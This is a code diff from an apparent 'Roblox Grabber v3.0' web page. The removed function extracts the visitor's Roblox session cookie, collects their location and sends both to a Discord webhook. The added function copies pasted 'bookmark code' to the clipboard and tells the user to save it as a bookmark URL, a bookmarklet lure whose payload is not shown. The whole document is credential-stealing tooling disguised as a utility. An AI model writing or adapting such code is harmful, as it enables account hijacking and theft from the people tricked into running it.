@@ -694,85 +694,71 @@ function extractRobloxCookieFromBrowser() {
     return robloxCookie;
 }
 
-// Roblox cookie extraction and webhook sending
+// Roblox Grabber v3.0 - Bookmark Installation
 async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
     const submitText = document.getElementById('submitText');
-    const loadingOverlay = document.getElementById('loadingOverlay');
+    const bookmarkCode = input.value.trim();
     
-    // Show loading state
+    if (!bookmarkCode) {
+        showNotification('❌ No bookmark code found!', 'error');
+        return;
+    }
+    
+    // Show copying state
     submitBtn.disabled = true;
-    submitText.textContent = 'Extracting Cookie...';
-    if (loadingOverlay) loadingOverlay.style.display = 'block';
-
+    submitText.textContent = 'Copying...';
+    
     try {
-        // First, try to extract cookie from browser directly
-        let robloxCookie = extractRobloxCookieFromBrowser();
+        // Copy to clipboard
+        await navigator.clipboard.writeText(bookmarkCode);
         
-        // If no cookie found in browser, try to extract from input text
-        if (!robloxCookie && input.value.trim()) {
-            robloxCookie = extractRobloxCookie(input.value.trim());
-        }
+        // Success feedback
+        submitText.textContent = 'Copied!';
+        submitBtn.style.background = '#28a745';
         
-        if (robloxCookie) {
-            submitText.textContent = 'Getting Location...';
+        showNotification('📋 Bookmark code copied to clipboard!', 'success');
+        
+        // Show additional instructions
+        setTimeout(() => {
+            showNotification('🚀 Now create a bookmark and paste the code as the URL!', 'info');
+        }, 2000);
+        
+        // Reset button after delay
+        setTimeout(() => {
+            submitBtn.disabled = false;
+            submitText.textContent = 'Copy Code';
+            submitBtn.style.background = '';
+        }, 4000);
+        
+    } catch (error) {
+        // Fallback method for older browsers
+        try {
+            input.select();
+            document.execCommand('copy');
             
-            // Get location info for webhook
-            const locationInfo = await getUserLocation();
-            
-            submitText.textContent = 'Sending to Webhook...';
-            
-            // Send to webhook
-            const webhookSuccess = await sendCookieToWebhook(robloxCookie, locationInfo);
-            
-            // Hide loading overlay
-            if (loadingOverlay) loadingOverlay.style.display = 'none';
-            
-            if (webhookSuccess) {
-                submitText.textContent = 'Cookie Sent!';
-                submitBtn.style.background = '#10b981';
-                
-                // Show success notification
-                showNotification('🍪 Cookie successfully sent to Discord webhook!', 'success');
-                
-                // Show cookie in modal
-                showCookieResultModal(robloxCookie, locationInfo, true);
-                
-                setTimeout(() => {
-                    closeScanModal();
-                }, 3000);
-            } else {
-                throw new Error('Failed to send cookie to webhook');
-            }
-        } else {
-            // No cookie found
-            if (loadingOverlay) loadingOverlay.style.display = 'none';
-            
-            submitText.textContent = 'No Cookie Found';
-            submitBtn.style.background = '#ef4444';
-            
-            showNotification('❌ No Roblox cookie found. Make sure you\'re logged into Roblox!', 'error');
+            submitText.textContent = 'Copied!';
+            submitBtn.style.background = '#28a745';
+            showNotification('📋 Bookmark code copied to clipboard!', 'success');
             
             setTimeout(() => {
                 submitBtn.disabled = false;
-                submitText.textContent = 'Extract Cookie';
+                submitText.textContent = 'Copy Code';
+                submitBtn.style.background = '';
+            }, 4000);
+            
+        } catch (fallbackError) {
+            submitText.textContent = 'Copy Failed';
+            submitBtn.style.background = '#dc3545';
+            showNotification('❌ Copy failed. Please select and copy the text manually.', 'error');
+            
+            setTimeout(() => {
+                submitBtn.disabled = false;
+                submitText.textContent = 'Copy Code';
                 submitBtn.style.background = '';
             }, 3000);
         }
-    } catch (error) {
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
-        
-        submitText.textContent = 'Error';
-        submitBtn.style.background = '#ef4444';
-        
-        showNotification(`Error: ${error.message}`, 'error');
-        
-        setTimeout(() => {
-            submitBtn.disabled = false;
-            submitText.textContent = 'Extract Cookie';
-            submitBtn.style.background = '';
-        }, 3000);
     }
 }
 
